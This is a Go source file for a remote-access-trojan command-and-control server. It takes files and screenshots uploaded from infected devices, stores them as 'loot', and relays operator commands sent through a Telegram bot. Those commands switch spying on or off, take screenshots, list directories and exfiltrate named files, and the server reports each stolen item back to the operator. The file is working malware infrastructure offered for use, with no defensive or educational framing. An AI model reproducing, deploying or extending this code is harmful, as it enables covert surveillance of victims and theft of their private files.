package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/gorilla/websocket"
)

var (
	token     = os.Getenv("TELEGRAM_TOKEN")
	chatIDStr = os.Getenv("CHAT_ID")
	clients   = make(map[*websocket.Conn]string) // Conn → Device ID
	upgrader  = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	lootDir = "./loot" // Organized storage
	mu      sync.Mutex
)

var chatID int64
var botInstance *bot.Bot // Global to avoid recreating in sendMsg

type LootEntry struct {
	Type      string    `json:"type"`      // "file", "screenshot", "keylog"
	Device    string    `json:"device"`    // From RAT "ready"
	File      string    `json:"file"`      // Name
	Size      int64     `json:"size_gb"`   // Formatted
	Path      string    `json:"path"`      // Local link
	Timestamp time.Time `json:"timestamp"`
}

func init() {
	var err error
	chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil {
		log.Fatal("Invalid CHAT_ID:", err)
	}
	os.MkdirAll(lootDir, 0755)
}

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	go startBot(ctx)

	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/upload_chunked", chunkedHandler)
	http.HandleFunc("/ws", wsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}
	log.Printf("C2 live on :%s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func startBot(ctx context.Context) {
	b, err := bot.New(token)
	if err != nil {
		log.Fatal("Bot init failed:", err)
	}
	botInstance = b

	// FIXED: Delete any existing webhook before polling to avoid conflicts
	_, delErr := b.DeleteWebhook(ctx, &bot.DeleteWebhookParams{})
	if delErr != nil {
		log.Printf("Delete webhook WARN: %v (continuing to polling)", delErr)
	} else {
		log.Println("Existing webhook deleted; switching to polling")
	}

	// FIXED: Add missing args to RegisterHandler: pattern ("" for any), matchType (Prefix)
	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, func(botCtx context.Context, b *bot.Bot, update *models.Update) {
		if update.Message == nil || update.Message.Chat.ID != chatID {
			return
		}
		msg := strings.ToLower(strings.TrimSpace(update.Message.Text))

		switch {
		case msg == "/start":
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   "RAT C2 Online. Connected devices: " + strconv.Itoa(len(clients)),
			})
		case strings.Contains(msg, "screenshot"):
			broadcastWS("screenshot")
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   "Screenshot command sent to all RATs.",
			})
		case strings.Contains(msg, "send_file"):
			fileName := "test.txt"
			if parts := strings.Fields(msg); len(parts) > 1 {
				fileName = strings.Join(parts[1:], " ")
			}
			broadcastWS(fmt.Sprintf("send_file %s", fileName))
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   fmt.Sprintf("File exfil '%s' triggered.", fileName),
			})
		case strings.Contains(msg, "file_list"):
			path := "/"
			if parts := strings.Fields(msg); len(parts) > 1 {
				path = strings.Join(parts[1:], " ")
			}
			broadcastWS(fmt.Sprintf("file_list %s", path))
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   fmt.Sprintf("File list '%s' requested.", path),
			})
		case strings.Contains(msg, "ping"):
			broadcastWS("ping")
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   "Ping sent to all RATs.",
			})
		case strings.Contains(msg, "off"):
			broadcastWS("off")
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   "Spying stopped on all RATs.",
			})
		case strings.Contains(msg, "on"):
			broadcastWS("on")
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   "Spying started on all RATs.",
			})
		case strings.Contains(msg, "use_device"):
			deviceID := ""
			if parts := strings.Fields(msg); len(parts) > 1 {
				deviceID = strings.Join(parts[1:], " ")
			}
			broadcastWS(fmt.Sprintf("use_device %s", deviceID))
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   fmt.Sprintf("Device '%s' selected.", deviceID),
			})
		case strings.Contains(msg, "/list"):
			listType := "all"
			if parts := strings.Fields(msg); len(parts) > 1 {
				listType = parts[1]
			}
			listLoot(listType)
		default:
			b.SendMessage(botCtx, &bot.SendMessageParams{
				ChatID: chatID,
				Text:   "Commands: /start, screenshot, send_file <name>, file_list <path>, ping, off, on, use_device <id>, /list <type>",
			})
		}
	})

	// FIXED: b.Start(ctx) returns nothing, so no err assignment; add retry for conflicts
	for {
		b.Start(ctx) // Blocks until ctx done; restarts on conflict via loop
		
	}
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]interface{}{
		"base_url":          r.Host,
		"connected_devices": len(clients),
		"status":            "running",
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "No file uploaded", http.StatusBadRequest)
		return
	}
	defer file.Close()

	deviceID := r.FormValue("device_id")
	if deviceID == "" {
		deviceID = "unknown"
	}
	path := filepath.Join(lootDir, deviceID, "files", header.Filename)
	dir := filepath.Dir(path)
	os.MkdirAll(dir, 0755)

	f, err := os.Create(path)
	if err != nil {
		log.Println("Create file error:", err)
		http.Error(w, "Save error", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	_, err = io.Copy(f, file)
	if err != nil {
		log.Println("Copy error:", err)
		http.Error(w, "Save error", http.StatusInternalServerError)
		return
	}

	off, seekErr := f.Seek(0, io.SeekEnd)
	if seekErr != nil {
		log.Println("Seek error:", seekErr)
		http.Error(w, "Size error", http.StatusInternalServerError)
		return
	}
	sizeGB := float64(off) / (1024 * 1024 * 1024)
	entry := LootEntry{Type: "file", Device: deviceID, File: header.Filename, Size: int64(sizeGB), Path: path, Timestamp: time.Now()}
	saveEntry(entry)
	msg := fmt.Sprintf("File exfil complete: %s (%.2f GB) from %s", header.Filename, sizeGB, deviceID)
	sendMsg(msg)
	w.Write([]byte("OK"))
}

func chunkedHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	defer r.Body.Close()

	deviceID := r.FormValue("device_id")
	if deviceID == "" {
		deviceID = "unknown"
	}
	filename := r.FormValue("filename")
	if filename == "" {
		filename = "chunked.dat"
	}
	path := filepath.Join(lootDir, deviceID, "screenshots", filename)
	dir := filepath.Dir(path)
	os.MkdirAll(dir, 0755)

	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println("Chunk open error:", err)
		http.Error(w, "Save error", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	_, err = io.Copy(f, r.Body)
	if err != nil {
		log.Println("Chunk copy error:", err)
		http.Error(w, "Save error", http.StatusInternalServerError)
		return
	}

	off, seekErr := f.Seek(0, io.SeekEnd)
	if seekErr != nil {
		log.Println("Seek error:", seekErr)
		http.Error(w, "Size error", http.StatusInternalServerError)
		return
	}
	sizeGB := float64(off) / (1024 * 1024 * 1024)
	entry := LootEntry{Type: "screenshot", Device: deviceID, File: filename, Size: int64(sizeGB), Path: path, Timestamp: time.Now()}
	saveEntry(entry)
	msg := fmt.Sprintf("Screenshot chunk complete: %s (%.2f GB total) from %s", filename, sizeGB, deviceID)
	sendMsg(msg)
	w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WS upgrade error:", err)
		return
	}
	defer conn.Close()

	mu.Lock()
	clients[conn] = "new-device" // Default; RAT "ready" updates
	mu.Unlock()
	log.Println("RAT connected via WS")

	for {
		_, msgBytes, err := conn.ReadMessage()
		if err != nil {
			mu.Lock()
			delete(clients, conn)
			mu.Unlock()
			log.Println("WS disconnect:", err)
			break
		}
		msg := string(msgBytes)
		log.Printf("RAT report: %s", msg)
		sendMsg(fmt.Sprintf("RAT report: %s", msg))

		// Handle RAT responses (e.g., JSON file list)
		if strings.Contains(msg, "file_list_response") {
			var response map[string]interface{}
			json.Unmarshal(msgBytes, &response)
			path, _ := response["path"].(string)
			files, _ := response["files"].([]interface{})
			fileList := fmt.Sprintf("File list from RAT (%s):\n", path)
			for _, f := range files {
				fileList += fmt.Sprintf("- %s\n", f)
			}
			sendMsg(fileList)
		} else if strings.HasPrefix(msg, "ready") {
			deviceID := strings.TrimPrefix(msg, "ready ")
			mu.Lock()
			for c := range clients {
				clients[c] = deviceID
			}
			mu.Unlock()
			sendMsg(fmt.Sprintf("RAT %s online", deviceID))
		}
	}
}

func broadcastWS(cmd string) {
	mu.Lock()
	defer mu.Unlock()
	for conn := range clients {
		if err := conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
			log.Println("WS broadcast error:", err)
			delete(clients, conn)
			conn.Close()
		}
	}
}

func sendMsg(text string) {
	if botInstance == nil {
		log.Println("Bot not ready for sendMsg")
		return
	}
	_, err := botInstance.SendMessage(context.Background(), &bot.SendMessageParams{
		ChatID: chatID,
		Text:   text,
	})
	if err != nil {
		log.Println("SendMsg error:", err)
	}
}

func saveEntry(entry LootEntry) {
	logEntry := fmt.Sprintf("[%s] %s: %s (%.2f GB) from %s → %s", entry.Timestamp.Format("2006-01-02 15:04:05"), entry.Type, entry.File, float64(entry.Size), entry.Device, entry.Path)
	log.Println(logEntry)

	logFile, err := os.OpenFile("c2.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println("Log file error:", err)
		return
	}
	defer logFile.Close()
	logFile.WriteString(logEntry + "\n")

	entryFile, err := os.OpenFile(fmt.Sprintf("%s/%s.json", lootDir, time.Now().Format("2006-01-02T15-04-05")), os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println("Entry file error:", err)
		return
	}
	defer entryFile.Close()
	json.NewEncoder(entryFile).Encode(entry)
}

func listLoot(listType string) {
	files, err := os.ReadDir(lootDir)
	if err != nil {
		sendMsg("Error listing loot: " + err.Error())
		return
	}
	var entries []LootEntry
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		dataBytes, err := os.ReadFile(f.Name())
		if err != nil {
			continue
		}
		var entry LootEntry
		if json.Unmarshal(dataBytes, &entry) == nil {
			if listType == "all" || entry.Type == listType {
				entries = append(entries, entry)
			}
		}
	}
	msg := fmt.Sprintf("Loot list (%s): %d items", listType, len(entries))
	for _, e := range entries {
		msg += fmt.Sprintf("\n- %s (%s, %.2f GB, %s)", e.File, e.Type, float64(e.Size), e.Timestamp.Format("2006-01-02 15:04"))
	}
	sendMsg(msg)
}

// Helper for backoff (add if not defined)
func min(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}